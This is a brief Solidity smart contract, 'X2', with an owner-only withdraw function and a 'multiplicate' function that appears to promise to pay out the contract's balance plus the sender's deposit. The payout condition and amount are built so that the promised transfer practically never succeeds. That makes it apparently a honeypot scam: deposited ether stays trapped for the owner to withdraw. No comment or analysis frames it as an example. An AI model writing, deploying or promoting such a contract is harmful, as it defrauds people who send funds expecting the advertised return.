contract X2
{
        address public Owner = msg.sender;

        function() public payable{}

        function withdraw()  payable public
        {
                require(msg.sender == Owner);
                Owner.transfer(this.balance);
        }

        function multiplicate(address adr) public payable
        {
            if(msg.value>=this.balance)
            {
                adr.transfer(this.balance+msg.value);
            }
        }


}